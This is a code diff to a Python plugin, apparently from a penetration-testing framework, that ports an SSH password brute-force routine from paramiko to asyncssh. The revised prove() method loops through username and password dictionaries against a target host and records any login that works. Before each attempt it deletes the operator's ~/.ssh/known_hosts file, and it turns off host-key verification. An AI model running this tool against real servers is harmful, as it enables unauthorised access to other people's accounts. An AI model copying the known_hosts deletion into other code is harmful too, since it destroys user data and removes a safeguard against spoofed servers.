@@ -2,11 +2,22 @@
 # -*- coding: utf-8 -*-
 # @author = 'orleven'
 
+import sys
 import os
-import paramiko
-from paramiko.ssh_exception import SSHException
+import asyncssh
 from script import Script, SERVICE_PORT_MAP
-from lib.core.data import paths
+
+class MySSHClientSession(asyncssh.SSHClientSession):
+    def data_received(self, data, datatype):
+        if datatype == asyncssh.EXTENDED_DATA_STDERR:
+            print(data, end='', file=sys.stderr)
+        else:
+            print(data, end='')
+
+    def connection_lost(self, exc):
+        if exc:
+            print('SSH session error: ' + str(exc), file=sys.stderr)
+
 
 class POC(Script):
     def __init__(self, target=None):
@@ -19,25 +30,20 @@ class POC(Script):
         Script.__init__(self, target=target, service_type=self.service_type)
 
 
-    def prove(self):
-        ssh = paramiko.SSHClient()
-        paramiko.util.log_to_file(os.path.join(paths.LOG_PATH, '.ssh.tmp'))
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    async def prove(self):
         usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
             'dict/ssh_usernames.txt')
         passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
             'dict/ssh_passwords.txt')
-        for linef1 in usernamedic:
-            username = linef1.strip('\r').strip('\n')
-            for linef2 in passworddic:
-                try:
-                    password = (
-                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
-                        '\r').strip('\n')
-                    ssh.connect(hostname=self.target_host, username=username,password = password, port=self.target_port,timeout=5)
+        async for (username, password) in self.generate_dict(usernamedic, passworddic):
+            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
+            if os.path.exists(known_hosts_path):
+                os.remove(known_hosts_path)
+            try:
+                async with asyncssh.connect(host=self.target_host, port=self.target_port, username=username,
+                                            password=password, known_hosts=None) as conn:
                     self.flag = 1
                     self.res.append({"info": username + "/" + password, "key": "ssh burst"})
                     return
-                except Exception as e:
-                    if "Errno 10061" in str(e) or "timed out" in str(e) or 'NoValidConnectionsError' in str(e):
-                        return
+            except:
+                pass
